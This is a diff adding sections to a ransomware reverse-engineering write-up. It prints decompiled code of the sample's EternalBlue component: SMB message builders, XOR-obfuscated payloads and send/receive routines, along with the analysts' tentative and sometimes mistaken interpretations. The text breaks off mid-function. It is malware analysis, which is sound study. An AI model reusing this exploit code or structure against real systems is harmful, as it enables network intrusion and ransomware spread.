@@ -9652,15 +9652,11 @@ This finished up the entire function for infecting other hosts via the admin sha
 
 This finishes the first thread started inside the loop.
 
-
-
-
-
-> EternalBlue
-> ==========================
->        Time Skip
-> ==========================
-> (because we are running out of time and EternalBlue is huge we at least want to see disk encryption in our ransomware...)
+> ==========================    
+>        Time Skip    
+> ==========================    
+> (because we are running out of time and EternalBlue is huge we at least want to see disk encryption in our ransomware...)    
+> Some functions between where we just returned to Ordinal_1 and the start of EternalBlue have been skipped. Initially EternalBlue was also skipped, however later we decided to quickly go over EternalBlue anyway, the analysis on the subroutines for EternalBlue is far from detailed and was more intended for us to get a general idea of the exploit.
 
 ### FUN_1000a274 (EternalBlue)
 
@@ -9843,7 +9839,7 @@ void FUN_10002068(void){
 
 Looks like this function is just socket cleanup and the socket is passed via `EAX` we will rename the function to `eternal_close_socket`. Since we see that it is called from one other function we also setup custom storage for the socket parameter.
 
-### FUN_10001f74
+### FUN_10001f74 (EternalBlue)
 
 ```cpp
 uint FUN_10001f74(void *param_1,size_t param_2,void *param_3,size_t param_4,void *param_5,size_t param_6,LPVOID *param_7,void **param_8,void *param_9,uint param_10,void *param_11,uint param_12){
@@ -10388,19 +10384,3918 @@ undefined4 FUN_10002ef5(undefined4 param_1,undefined4 param_2,undefined4 param_3
 }
 ```
 
+First we add custom storage for `EAX` which reveals that `param_1` was also passed as an argument.
 
+Next we look at `FUN_1000270a`.
 
+### FUN_1000270a (EternalBlue)
 
+```cpp
+undefined4 * FUN_1000270a(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4){
+  ushort *in_EAX;
+  byte *pbVar1;
+  byte *_Dst;
+  undefined4 *puVar2;
+  int iVar3;
+  undefined4 *puVar4;
+  undefined4 *puVar5;
+  LPVOID local_c;
+  
+  _Dst = (byte *)allocate_memory(0x62);
+  if (_Dst != (byte *)0x0) {
+    memcpy(_Dst,&DAT_10018ad0,0x62);
+    iVar3 = 0x62;
+    pbVar1 = _Dst;
+    do {
+      *pbVar1 = *pbVar1 ^ 0x72;
+      pbVar1 = pbVar1 + 1;
+      iVar3 = iVar3 + -1;
+    } while (iVar3 != 0);
+    local_c = allocate_memory(0x65);
+    if (local_c == (LPVOID)0x0) {
+      local_c = (void *)0x0;
+    }
+    else {
+      *(undefined2 *)((int)local_c + 1) = 0x62;
+      memcpy((void *)((int)local_c + 3),_Dst,0x62);
+    }
+    if (local_c != (void *)0x0) {
+      *in_EAX = 0x89;
+      puVar4 = (undefined4 *)FUN_10002466(0x89,0x72,param_1,param_2,0,param_3,0,param_4);
+      if (puVar4 != (undefined4 *)0x0) {
+        puVar2 = (undefined4 *)allocate_memory((uint)*in_EAX);
+        if (puVar2 != (undefined4 *)0x0) {
+          iVar3 = 9;
+          puVar5 = puVar2;
+          while (iVar3 != 0) {
+            iVar3 = iVar3 + -1;
+            *puVar5 = *puVar4;
+            puVar4 = puVar4 + 1;
+            puVar5 = puVar5 + 1;
+          }
+          memcpy(puVar2 + 9,local_c,0x65);
+        }
+        FUN_100020d0();
+        FUN_100020d0();
+        FUN_100020d0();
+        return puVar2;
+      }
+      FUN_100020d0();
+    }
+    FUN_100020d0();
+    _Dst = (byte *)0x0;
+  }
+  return (undefined4 *)_Dst;
+}
+```
 
+First we add custom storage for `EAX`. Besides this after some memory allocation we see a call to `FUN_10002466`.
 
+### FUN_10002466 (EternalBlue)
 
+```cpp
+int FUN_10002466(int param_1,undefined param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,undefined2 param_6,undefined2 param_7,undefined2 param_8){
+  u_short uVar1;
+  LPVOID pvVar2;
+  
+  pvVar2 = allocate_memory(0x24);
+  if (pvVar2 != (LPVOID)0x0) {
+    uVar1 = htons((short)param_1 - 4);
+    *(u_short *)((int)pvVar2 + 2) = uVar1;
+    *(undefined *)((int)pvVar2 + 8) = param_2;
+    *(undefined2 *)((int)pvVar2 + 0xe) = param_3;
+    *(undefined2 *)((int)pvVar2 + 0x10) = param_4;
+    *(undefined2 *)((int)pvVar2 + 0x1c) = param_5;
+    *(undefined2 *)((int)pvVar2 + 0x1e) = param_6;
+    *(undefined2 *)((int)pvVar2 + 0x20) = param_7;
+    *(undefined2 *)((int)pvVar2 + 0x22) = param_8;
+    *(undefined4 *)((int)pvVar2 + 4) = 0x424d53ff;
+    *(undefined *)((int)pvVar2 + 0xd) = 0x18;
+  }
+  return (int)pvVar2;
+}
+```
 
+The first thing of note is taht this function has a ton of incoming references. It appers to be creating a struct of some sort although the type is unknown. Googling the constant `0x424d53ff` reveals that this is related to a SMB message. Meaning that the struct we are looking at there is probaby related to SMB. More searching reveals that `0x424d53ff` is the SMB magic header. Which means that this is definitely a SMB message being structed, which one however is unknown. For now we will rename the subroutine to `eternal_create_smb_message`.
 
+### Back to FUN_1000270a
 
+Back we see that the message that was created is the coped into some newly allocated and then returned. However before that there are a lot of calls to `FUN_100020d0`.
 
+### FUN_100020d0 (EternalBlue)
 
+```cpp
+void FUN_100020d0(void){
+  HANDLE hHeap;
+  LPVOID *unaff_ESI;
+  DWORD dwFlags;
+  LPVOID lpMem;
+  
+  lpMem = *unaff_ESI;
+  if (lpMem != (LPVOID)0x0) {
+    dwFlags = 8;
+    hHeap = GetProcessHeap();
+    HeapFree(hHeap,dwFlags,lpMem);
+    *unaff_ESI = (LPVOID)0x0;
+  }
+  return;
+}
+```
 
+This function just frees memory passed via `ESI` so we will add custom storage for that and rename the function to `eternal_free`.
 
+### Back to FUN_1000270a
+
+A little bit more last minute research into the `0x72` constant pass to create the SMB message reveals that it is an `SMB_COM_NEGOTIATE` message. Meaning we will rename this function to `eternal_negotiate_smb_connection`.
+
+### Back to FUN_10002ef5
+
+After negotiating a SMB connection we see more memory being allocated and `FUN_1000688f` being called.
+
+### FUN_1000688f (EternalBlue)
+
+```cpp
+int FUN_1000688f(int param_1){
+  int iVar1;
+  u_int local_110;
+  timeval local_c;
+  
+  if (param_1 != 0) {
+    memset(&stack0xfffffef4,0,0x100);
+    local_c.tv_sec = 0;
+    local_c.tv_usec = 13000000;
+    local_110 = 1;
+    iVar1 = select(0,(fd_set *)0x0,(fd_set *)&local_110,(fd_set *)0x0,&local_c);
+    if ((iVar1 != -1) && (iVar1 != 0)) {
+      iVar1 = Ordinal_19();
+      return (uint)(0 < iVar1) - 1;
+    }
+  }
+  return -1;
+}
+```
+
+Looking at this function we see that more data was passed on the stack, especially after resolving `Ordinal_19` which turns out to be the `send` function, which turns out to store the SMB message created earlier this also reveals that `EBX` is used to pass the socket turning hte function into.
+
+```cpp
+int FUN_1000688f(int param_1,undefined param_2,SOCKET param_3){
+  int iVar1;
+  u_int local_110;
+  timeval local_c;
+  
+  if (param_1 != 0) {
+    memset(&stack0xfffffef4,0,0x100);
+    local_c.tv_sec = 0;
+    local_c.tv_usec = 13000000;
+    local_110 = 1;
+    iVar1 = select(0,(fd_set *)0x0,(fd_set *)&local_110,(fd_set *)0x0,&local_c);
+    if ((iVar1 != -1) && (iVar1 != 0)) {
+      iVar1 = send(param_3,(char *)param_1,_param_2,0);
+      return (uint)(0 < iVar1) - 1;
+    }
+  }
+  return -1;
+}
+```
+
+This makes it clear that this function just sends a message so we will rename it `eternal_send_message`.
+
+### Back to FUN_10002ef5
+
+Next we take a look at `FUN_1000243f`.
+
+### FUN_1000243f (EternalBlue)
+
+```cpp
+int FUN_1000243f(undefined4 param_1,byte param_2){
+  int iVar1;
+  int local_8;
+  
+  local_8 = 0x1000;
+  iVar1 = FUN_100067af(param_1,param_2,&local_8);
+  return -(uint)(iVar1 != 0);
+}
+```
+
+Given that this function just delegates everything to `FUN_100067af` we will go there next.
+
+### FUN_100067af (EternalBlue)
+
+```cpp
+undefined4 FUN_100067af(SOCKET param_1,byte param_2,int *param_3){
+  uint uVar1;
+  ushort uVar2;
+  u_short uVar3;
+  short sVar4;
+  int iVar5;
+  uint uVar6;
+  int *unaff_EBX;
+  ushort *unaff_ESI;
+  uint uVar7;
+  u_int local_110;
+  SOCKET local_10c;
+  timeval local_c;
+  
+  memset(&local_110 + 4,0,0x100);
+  local_c.tv_sec = 0;
+  local_10c = param_1;
+  local_c.tv_usec = 13000000;
+  local_110 = 1;
+  iVar5 = select(0,(fd_set *)&local_110,(fd_set *)0x0,(fd_set *)0x0,&local_c);
+  if ((iVar5 != -1) && (iVar5 != 0)) {
+    uVar2 = Ordinal_16(param_1,*unaff_EBX,*param_3,0);
+    *unaff_ESI = uVar2;
+    if (0 < (short)uVar2) {
+      uVar3 = htons(*(u_short *)(*unaff_EBX + 2));
+      uVar7 = (uint)(ushort)(uVar3 + 4) * (uint)param_2;
+      uVar6 = (uint)*unaff_ESI;
+      uVar1 = uVar6;
+      if (uVar6 != uVar7) {
+        while (uVar1 < uVar7) {
+          sVar4 = Ordinal_16(param_1,*unaff_EBX + uVar6,*param_3 - uVar6,0);
+          if (sVar4 < 1) {
+            return 0xffffffff;
+          }
+          *unaff_ESI = *unaff_ESI + sVar4;
+          uVar6 = (uint)*unaff_ESI;
+          uVar1 = (uint)*unaff_ESI;
+        }
+      }
+      return 0;
+    }
+  }
+  return 0xffffffff;
+}
+```
+
+First we add custom storage for `EBX` and `ESI` and resolve the reference to `Ordinal_16`. It now becomes clear that the function aways a positive response before returning so we rename teh function to `eternal_await_positive_response`.
+
+### Back to FUN_10002ef5
+
+Since it is now clear that this function send an SMB negotiate connection message we will rename the function to `eternal_negotiate_smb_connection
+
+```cpp
+undefined4 FUN_100067af(SOCKET param_1,byte param_2,int *param_3,char **param_4,ushort *param_5){
+  uint uVar1;
+  u_short uVar2;
+  int iVar3;
+  uint uVar4;
+  uint uVar5;
+  u_int local_110;
+  SOCKET local_10c;
+  timeval local_c;
+  
+  memset(&local_110 + 4,0,0x100);
+  local_c.tv_sec = 0;
+  local_10c = param_1;
+  local_c.tv_usec = 13000000;
+  local_110 = 1;
+  iVar3 = select(0,(fd_set *)&local_110,(fd_set *)0x0,(fd_set *)0x0,&local_c);
+  if ((iVar3 != -1) && (iVar3 != 0)) {
+    iVar3 = recv(param_1,*param_4,*param_3,0);
+    *param_5 = (ushort)iVar3;
+    if (0 < (short)(ushort)iVar3) {
+      uVar2 = htons(*(u_short *)(*param_4 + 2));
+      uVar5 = (uint)(ushort)(uVar2 + 4) * (uint)param_2;
+      uVar4 = (uint)*param_5;
+      uVar1 = uVar4;
+      if (uVar4 != uVar5) {
+        while (uVar1 < uVar5) {
+          iVar3 = recv(param_1,*param_4 + uVar4,*param_3 - uVar4,0);
+          if ((short)iVar3 < 1) {
+            return 0xffffffff;
+          }
+          *param_5 = *param_5 + (short)iVar3;
+          uVar4 = (uint)*param_5;
+          uVar1 = (uint)*param_5;
+        }
+      }
+      return 0;
+    }
+  }
+  return 0xffffffff;
+}
+```
+
+This reveals that this entire function is basically just to wait or a response message. Most likely to the SMB message that was sent. If a message was received without exceptions then the function returns `0`. We will rename this function to `eternal_await_positive_reponse`.
+
+### Back to FUN_1000243f
+
+First we add custom storage for a stack variable and `ESI` to make it possible to pass these down to the await function resulting in.
+
+```cpp
+int FUN_1000243f(undefined4 param_1,byte param_2,undefined param_3,undefined4 param_4){
+  int iVar1;
+  int local_8;
+  
+  local_8 = 0x1000;
+  iVar1 = eternal_await_positive_reponse(param_1,param_2,&local_8,&param_3,param_4);
+  return -(uint)(iVar1 != 0);
+}
+```
+
+We will rename the funtion to `eternal_await_response`.
+
+### Back to FUN_10002ef5
+
+Given that we now know that the function negotiates and SMB connection and awaits a reponse we will rename the function to `eternal_open_smb_connection`.
+
+### Back to eternal_blue_main
+
+Next we look at `FUN_10002f88` which is invoked directly after an SMB connection is established.
+
+### FUN_10002f88 (EternalBlue)
+
+```cpp
+FUN_10002f88(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined2 *param_4,LPVOID param_5,int param_6,undefined4 param_7,uint param_8,LPVOID *param_9,undefined2 *param_10){
+  uint uVar1;
+  undefined4 in_EAX;
+  undefined4 uVar2;
+  LPVOID _Src;
+  int iVar3;
+  LPVOID _Dst;
+  uint num_bytes;
+  undefined4 local_8;
+  
+  local_8 = 0;
+  param_6 = FUN_100028b5(param_1,param_2,param_3,param_5,param_7,param_8,&local_8);
+  if (param_6 == 0) {
+    uVar2 = 0xffffffff;
+  }
+  else {
+    _Src = allocate_memory(0x1000);
+    param_5 = _Src;
+    if (_Src == (LPVOID)0x0) {
+      eternal_free(&param_6);
+      uVar2 = 0xffffffff;
+    }
+    else {
+      param_8 = 0;
+      iVar3 = eternal_send_message(param_6,(char)local_8,in_EAX);
+      if ((iVar3 == 0) &&
+         (iVar3 = eternal_await_response(in_EAX,1,(char)_Src,&param_8), uVar1 = param_8, iVar3 == 0)
+         ) {
+        num_bytes = param_8 & 0xffff;
+        *param_4 = *(undefined2 *)((int)_Src + 0x20);
+        param_7 = *(undefined4 *)((int)_Src + 9);
+        _Dst = allocate_memory(num_bytes);
+        *param_9 = _Dst;
+        if (_Dst == (LPVOID)0x0) {
+          param_7 = 0xffffffff;
+          uVar2 = param_7;
+        }
+        else {
+          *param_10 = (short)uVar1;
+          memcpy(_Dst,_Src,num_bytes);
+          uVar2 = param_7;
+        }
+      }
+      else {
+        uVar2 = 0xffffffff;
+      }
+      eternal_free(&param_5);
+      eternal_free(&param_6);
+    }
+  }
+  return uVar2;
+}
+```
+
+First we add custom storage for `EAX`. Next we look at `FUN_100028b5` which is the first function that is invoked.
+
+### FUN_1000028b5 (EternalBlue)
+
+```cpp
+undefined4 * FUN_100028b5(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined4 *param_5,char *param_6,undefined4 *param_7){
+  ushort *puVar1;
+  uint uVar2;
+  char in_AL;
+  undefined2 *puVar3;
+  int iVar4;
+  undefined4 *puVar5;
+  undefined4 *puVar6;
+  uint local_c;
+  undefined2 *local_8;
+  
+  if ((in_AL != '\f') && (in_AL != '\r')) {
+    return (undefined4 *)0;
+  }
+  local_8 = (undefined2 *)0x0;
+  if (in_AL == '\f') {
+    local_8 = (undefined2 *)allocate_memory(0x16);
+    if (local_8 == (undefined2 *)0x0) {
+      return (undefined4 *)0;
+    }
+  }
+  else {
+    if (in_AL == '\r') {
+      iVar4 = 0x4b;
+      local_8 = (undefined2 *)allocate_memory(0x4b);
+      if (local_8 == (undefined2 *)0x0) {
+        return (undefined4 *)0;
+      }
+      memcpy(local_8,&DAT_10018b48,0x4b);
+      puVar3 = local_8;
+      do {
+        *(byte *)puVar3 = *(byte *)puVar3 ^ 0x73;
+        puVar3 = (undefined2 *)((int)puVar3 + 1);
+        iVar4 = iVar4 + -1;
+      } while (iVar4 != 0);
+    }
+  }
+  local_c = 0;
+  param_6 = FUN_10002802(&local_c,local_8,in_AL,(short)param_5,(short)param_6);
+  uVar2 = local_c;
+  puVar1 = (ushort *)param_7;
+  if (param_6 != (char *)0x0) {
+    *(ushort *)param_7 = (ushort)(local_c + 0x24);
+    puVar5 = (undefined4 *)
+             eternal_create_smb_message(local_c + 0x24,0x73,param_1,param_2,0,param_3,0,param_4);
+    param_5 = puVar5;
+    if (puVar5 != (undefined4 *)0x0) {
+      param_7 = (undefined4 *)allocate_memory((uint)*puVar1);
+      if (param_7 == (undefined4 *)0x0) {
+        puVar5 = (undefined4 *)0x0;
+      }
+      else {
+        iVar4 = 9;
+        puVar6 = param_7;
+        while (iVar4 != 0) {
+          iVar4 = iVar4 + -1;
+          *puVar6 = *puVar5;
+          puVar5 = puVar5 + 1;
+          puVar6 = puVar6 + 1;
+        }
+        memcpy(param_7 + 9,param_6,uVar2 & 0xffff);
+        puVar5 = param_7;
+      }
+      eternal_free(&param_6);
+      eternal_free(&local_8);
+      eternal_free(&param_5);
+      return puVar5;
+    }
+    eternal_free(&param_6);
+  }
+  eternal_free(&local_8);
+  return (undefined4 *)0;
+}
+```
+
+This function seems to rely on the value of `param_8` (register `AL`). And this char has to be either `\f` or `\r`. In the case of `\r` the value of `DAT_10018b48` is loaded which is then XOR'ed with `0x73`. Before being passed `FUN_10002802` most likely it's just a payload and it's XOR'ed with `0x73` to make analysis of the binary more difficult.
+
+### FUN_10002802 (EternalBlue)
+
+```cpp
+char * __thiscall FUN_10002802(void *this,undefined2 *param_1,char param_2,undefined2 param_3,undefined2 param_4){
+  char *pcVar1;
+  ushort uVar2;
+  ushort unaff_DI;
+  
+  if ((unaff_DI == 0) || (param_1 != (undefined2 *)0x0)) {
+    uVar2 = 0x1b;
+    if (param_2 == '\r') {
+      uVar2 = 0x1d;
+    }
+    *(ushort *)this = uVar2 + unaff_DI;
+    pcVar1 = (char *)allocate_memory((uint)(ushort)(uVar2 + unaff_DI));
+    if (pcVar1 != (char *)0x0) {
+      *(undefined2 *)(pcVar1 + 5) = 0x1104;
+      *(undefined2 *)(pcVar1 + 7) = 10;
+      *pcVar1 = param_2;
+      pcVar1[1] = -1;
+      *(undefined2 *)(pcVar1 + 9) = param_3;
+      if (param_2 == '\f') {
+        *(undefined4 *)(pcVar1 + 0x15) = 0x80000000;
+        *(ushort *)(pcVar1 + 0x19) = unaff_DI;
+        *param_1 = param_4;
+      }
+      if (param_2 == '\r') {
+        *(undefined2 *)(pcVar1 + 3) = 0x88;
+        *(undefined2 *)(pcVar1 + 0xf) = 1;
+        *(undefined4 *)(pcVar1 + 0x17) = 0xd4;
+        *(ushort *)(pcVar1 + 0x1b) = unaff_DI;
+      }
+      if (unaff_DI != 0) {
+        memcpy(pcVar1 + uVar2,param_1,(uint)unaff_DI);
+      }
+    }
+  }
+  else {
+    pcVar1 = (char *)0x0;
+  }
+  return pcVar1;
+}
+```
+
+Here we again see data being assigned to what should probably be an object or struct. Googling `0x1104` reveals that this is the constant for `MaxBufferSize` meaning that this is again a type of SMB message. Given that we loaded some special data earlier we will rename this function to `eternal_create_smb_msg_with_data`.
+
+### Back to FUN_100028b5
+
+Here we see a call to `eternal_create_smb_message` next, it's possible that isntead of creating a message our function from just now just prepared a payload to send with the message.
+
+Either way we will rename this function to `eternal_create_smb_message_with_payload` as it does not appear that hte message is sent here.
+
+### Back to FUN_10002f88
+
+Here we see what we were missing in the function. The created message is sent and the response is awwaited. The resposne also appears to be the return value so we will rename the function to `eternal_send_smb_payload_get_response`.
+
+### Back to eternal_blue_main
+
+Back in the root function we next wee call to `FUN_100031fb` given that an error occurred.
+
+### FUN_100031fb (EternalBlue)
+
+```cpp
+undefined4 FUN_100031fb(undefined4 param_1,undefined4 param_2,undefined4 param_3,LPVOID param_4,undefined4 param_5,undefined4 *param_6){
+  undefined uVar1;
+  LPVOID pvVar2;
+  int iVar3;
+  undefined4 *puVar4;
+  undefined4 **ppuVar5;
+  undefined4 *puVar6;
+  undefined4 *puVar7;
+  undefined4 uVar8;
+  undefined local_10;
+  undefined4 *local_c;
+  undefined4 *local_8;
+  
+  local_10 = 0;
+  local_8 = (undefined4 *)allocate_memory(7);
+  if (local_8 == (undefined4 *)0x0) {
+    local_8 = (undefined4 *)0x0;
+  }
+  else {
+    *(undefined2 *)local_8 = 0xff02;
+  }
+  local_c = local_8;
+  if (local_8 != (undefined4 *)0x0) {
+    local_10 = 0x2b;
+    uVar1 = local_10;
+    local_10 = 0x2b;
+    param_6 = (undefined4 *)
+              eternal_create_smb_message
+                        (0x2b,0x74,0xc007,(undefined2)param_2,(undefined2)param_3,(short)param_4,
+                         (short)param_5,(short)param_6);
+    if (param_6 == (undefined4 *)0x0) {
+      ppuVar5 = &local_c;
+    }
+    else {
+      puVar4 = (undefined4 *)allocate_memory(0x2b);
+      if (puVar4 != (undefined4 *)0x0) {
+        iVar3 = 9;
+        puVar6 = param_6;
+        puVar7 = puVar4;
+        while (iVar3 != 0) {
+          iVar3 = iVar3 + -1;
+          *puVar7 = *puVar6;
+          puVar6 = puVar6 + 1;
+          puVar7 = puVar7 + 1;
+        }
+        puVar4[9] = *local_8;
+        *(undefined2 *)(puVar4 + 10) = *(undefined2 *)(local_8 + 1);
+        *(undefined *)((int)puVar4 + 0x2a) = *(undefined *)((int)local_8 + 6);
+        eternal_free(&local_c);
+        eternal_free(&param_6);
+        goto LAB_1000329e;
+      }
+      eternal_free(&local_c);
+      ppuVar5 = (undefined4 **)&param_6;
+    }
+    eternal_free(ppuVar5);
+    local_10 = uVar1;
+  }
+  puVar4 = (undefined4 *)0x0;
+LAB_1000329e:
+  if (puVar4 != (undefined4 *)0x0) {
+    param_6 = puVar4;
+    pvVar2 = allocate_memory(0x1000);
+    param_4 = pvVar2;
+    if (pvVar2 != (LPVOID)0x0) {
+      param_5 = 0;
+      iVar3 = eternal_send_message((int)puVar4,local_10,param_1);
+      if ((iVar3 == 0) &&
+         (iVar3 = eternal_await_response(param_1,1,(char)pvVar2,&param_5), iVar3 == 0)) {
+        uVar8 = *(undefined4 *)((int)pvVar2 + 9);
+      }
+      else {
+        uVar8 = 0xffffffff;
+      }
+      eternal_free(&param_4);
+      eternal_free(&param_6);
+      return uVar8;
+    }
+    eternal_free(&param_6);
+  }
+  return 0xffffffff;
+}
+```
+
+This subroutine again craft an SMB message this time of the `SMB_COM_LOGOFF_ANDX` type. This message is then sent and a response awaited which is also the return value of the subroutine.
+
+We will rename this function to `eternal_send_smd_logoff_msg`.
+
+### Back to eternal_blue_main
+
+Next we look at the succes branch, which invokes `FUN_100022a2`.
+
+### FUN_100022a2 (EternalBlue)
+
+```cpp
+uint FUN_100022a2(ushort param_1){
+  ushort uVar1;
+  int iVar2;
+  int iVar3;
+  ushort uVar4;
+  uint in_EAX;
+  undefined3 uVar5;
+  uint uVar6;
+  uint uVar7;
+  uint uVar8;
+  byte local_5;
+  
+  local_5 = 0xff;
+  uVar5 = (undefined3)(in_EAX >> 8);
+  if (0x2c < param_1) {
+    uVar1 = *(ushort *)(in_EAX + 0x2b);
+    uVar6 = (uint)uVar1;
+    if (7 < uVar1) {
+      if ((uint)param_1 < uVar6 + 0x2d) {
+        return CONCAT31(uVar5,0xff);
+      }
+      uVar4 = 0;
+      if (uVar1 != 8) {
+        uVar8 = 0;
+        do {
+          iVar2 = *(int *)(uVar8 + 0x2d + in_EAX);
+          iVar3 = *(int *)(uVar8 + 0x31 + in_EAX);
+          if ((iVar2 == 0x350020) && (iVar3 == 0x31002e)) goto LAB_100023fb;
+          if ((iVar2 == 0x350020) && (iVar3 == 0x32002e)) goto LAB_10002401;
+          if ((iVar2 == 0x690056) && (iVar3 == 0x740073)) goto LAB_10002407;
+          if ((iVar2 == 0x730077) && (iVar3 == 0x370020)) goto LAB_1000240d;
+          if ((iVar2 == 0x300032) && (iVar3 == 0x380030)) {
+            uVar7 = 0;
+            local_5 = 6;
+            uVar8 = 0;
+            goto LAB_100023d6;
+          }
+          uVar4 = uVar4 + 1;
+          uVar8 = (uint)uVar4;
+        } while (uVar8 < uVar6 - 8);
+      }
+      uVar8 = 0;
+      if (uVar1 != 4) {
+        uVar7 = 0;
+        do {
+          iVar2 = *(int *)(uVar7 + 0x2d + in_EAX);
+          if (iVar2 == 0x312e3520) goto LAB_100023fb;
+          if (iVar2 == 0x322e3520) goto LAB_10002401;
+          if (iVar2 == 0x74736956) goto LAB_10002407;
+          if (iVar2 == 0x37207377) goto LAB_1000240d;
+          if (iVar2 == 0x38303032) {
+            uVar7 = 0;
+            local_5 = 6;
+            uVar8 = 0;
+            goto LAB_1000241b;
+          }
+          uVar8 = uVar8 + 1;
+          uVar7 = uVar8 & 0xffff;
+        } while (uVar7 < uVar6 - 4);
+      }
+      goto LAB_10002435;
+    }
+  }
+  return CONCAT31(uVar5,0xff);
+  while( true ) {
+    uVar7 = uVar7 + 1;
+    uVar8 = uVar7 & 0xffff;
+    if (uVar6 - 8 <= uVar8) break;
+LAB_100023d6:
+    if ((*(int *)(uVar8 + 0x2d + in_EAX) == 0x200038) &&
+       (*(int *)(uVar8 + 0x31 + in_EAX) == 0x320052)) goto LAB_10002431;
+  }
+  goto LAB_10002435;
+LAB_100023fb:
+  local_5 = 2;
+  goto LAB_10002435;
+LAB_10002401:
+  local_5 = 3;
+  goto LAB_10002435;
+LAB_10002407:
+  local_5 = 4;
+  goto LAB_10002435;
+LAB_1000240d:
+  local_5 = 5;
+  goto LAB_10002435;
+LAB_10002431:
+  local_5 = 7;
+  goto LAB_10002435;
+  while( true ) {
+    uVar7 = uVar7 + 1;
+    uVar8 = uVar7 & 0xffff;
+    if (uVar6 - 4 <= uVar8) break;
+LAB_1000241b:
+    if (*(int *)(uVar8 + 0x2d + in_EAX) == 0x32522038) goto LAB_10002431;
+  }
+LAB_10002435:
+  return in_EAX & 0xffffff00 | (uint)local_5;
+}
+```
+
+There are a lot of very specific constants in this subroutine. Most of these appear to be specific error codes. Which would make this a function to check the error status after sending SMB messages. Given that this is the best we have to go on we will rename the function to `eternal_check_smb_error`.
+
+### Back to eternal_blue_main
+
+The first thing we notice is that checking the error status might have been wrong. Although it's not entirely impossible. Either way we see the presumable SMB message object beign freed and then a branch based on an error status. If the check passes then `FUN_10003061` is invoked.
+
+### FUN_10003061 (EternalBlue)
+
+```cpp
+undefined4 FUN_10003061(undefined4 param_1,undefined2 *param_2,LPVOID param_3,undefined4 param_4,int param_5){
+  undefined4 in_EAX;
+  undefined4 uVar1;
+  LPVOID pvVar2;
+  int iVar3;
+  
+  param_5 = FUN_100029ce(param_1,param_3,param_4,param_5);
+  if (param_5 == 0) {
+    uVar1 = 0xffffffff;
+  }
+  else {
+    pvVar2 = allocate_memory(0x1000);
+    param_3 = pvVar2;
+    if (pvVar2 == (LPVOID)0x0) {
+      eternal_free(&param_5);
+      uVar1 = 0xffffffff;
+    }
+    else {
+      param_4 = 0;
+      iVar3 = eternal_send_message(param_5,0,in_EAX);
+      if ((iVar3 == 0) &&
+         (iVar3 = eternal_await_response(in_EAX,1,(char)pvVar2,&param_4), iVar3 == 0)) {
+        uVar1 = *(undefined4 *)((int)pvVar2 + 9);
+        *param_2 = *(undefined2 *)((int)pvVar2 + 0x1c);
+      }
+      else {
+        uVar1 = 0xffffffff;
+      }
+      eternal_free(&param_3);
+      eternal_free(&param_5);
+    }
+  }
+  return uVar1;
+}
+```
+
+This again looks like a function that sends a specific SMB message. First we add custom storage for `EAX` and then we look into `FUN_100029ce`.
+
+### FUN_100029ce (EternalBlue)
+
+```cpp
+undefined4 * FUN_100029ce(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined4 *param_4){
+  ushort *in_EAX;
+  undefined4 *puVar1;
+  undefined4 *_Dst;
+  int iVar2;
+  undefined4 *puVar3;
+  undefined2 *local_10;
+  undefined2 *local_c;
+  undefined4 *local_8;
+  
+  _Dst = (undefined4 *)allocate_memory(0x2d);
+  if (_Dst != (undefined4 *)0x0) {
+    local_8 = _Dst;
+    memcpy(_Dst,s_u)u)uDuGuFu[uDuGu[uFuDu[uGu)u<u%_10018b94,0x2d);
+    iVar2 = 0x2d;
+    puVar1 = _Dst;
+    do {
+      *(byte *)puVar1 = *(byte *)puVar1 ^ 0x75;
+      puVar1 = (undefined4 *)((int)puVar1 + 1);
+      iVar2 = iVar2 + -1;
+    } while (iVar2 != 0);
+    local_c = (undefined2 *)allocate_memory(0x38);
+    if (local_c == (undefined2 *)0x0) {
+      local_c = (undefined2 *)0x0;
+    }
+    else {
+      *(undefined2 *)((int)local_c + 3) = 0x58;
+      *(undefined2 *)((int)local_c + 5) = 8;
+      *(undefined2 *)((int)local_c + 7) = 1;
+      *(undefined2 *)((int)local_c + 9) = 0x2d;
+      *local_c = 0xff04;
+      memcpy((void *)((int)local_c + 0xb),_Dst,0x2d);
+    }
+    local_10 = local_c;
+    if (local_c != (undefined2 *)0x0) {
+      *in_EAX = 0x5c;
+      _Dst = (undefined4 *)
+             eternal_create_smb_message(0x5c,0x75,0xc007,param_1,0,param_2,param_3,(short)param_4);
+      param_4 = _Dst;
+      if (_Dst != (undefined4 *)0x0) {
+        puVar1 = (undefined4 *)allocate_memory((uint)*in_EAX);
+        if (puVar1 != (undefined4 *)0x0) {
+          iVar2 = 9;
+          puVar3 = puVar1;
+          while (iVar2 != 0) {
+            iVar2 = iVar2 + -1;
+            *puVar3 = *_Dst;
+            _Dst = _Dst + 1;
+            puVar3 = puVar3 + 1;
+          }
+          memcpy(puVar1 + 9,local_c,0x38);
+        }
+        eternal_free(&local_10);
+        eternal_free(&local_8);
+        eternal_free(&param_4);
+        return puVar1;
+      }
+      eternal_free(&local_10);
+    }
+    eternal_free(&local_8);
+    _Dst = (undefined4 *)0x0;
+  }
+  return _Dst;
+}
+```
+
+Again here we see an SMB message being constructed with a specific payload or most likely this is just the computation of the payload. The payload in this case is again XOR'ed with `0x75`. Checking the first value of `0xa2` by XOR'ing with `0x75` yields `D7` or `215` making it unlikely for this to be a string. So we will just treat it as payload instead of trying to get the real value out.
+
+If we do this then we see that an SMB message of the type `0x75` meaning `SMB_COM_TREE_CONNECT_ANDX` is created. This message is also the returned value of this function meaning we will rename it to `eternal_create_tree_connect_smb_msg`.
+
+### Back to FUN_10003061
+
+The remainder of this function is then fairly simple, the just constructed SMB message is sent and a resposne is waited and returned. So we will rename the function to `eternal_send_smb_tree_connect`.
+
+### Back to eternal_blue_main
+
+Continuing past the error checks we next see a call to `FUN_1000330e`.
+
+### FUN_1000330e (EternalBlue)
+
+```cpp
+undefined4 FUN_1000330e(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,undefined2 param_6,undefined4 param_7,undefined4 *param_8,void *param_9,ushort param_10,int *param_11,void **param_12,undefined2 *param_13){
+  int iVar1;
+  LPVOID _Dst;
+  undefined uVar2;
+  undefined4 uVar3;
+  undefined4 *puVar4;
+  undefined4 **ppuVar5;
+  undefined4 *_Src;
+  uint num_bytes;
+  undefined4 *puVar6;
+  undefined2 in_stack_0000002a;
+  cls_10002ccf local_8;
+  
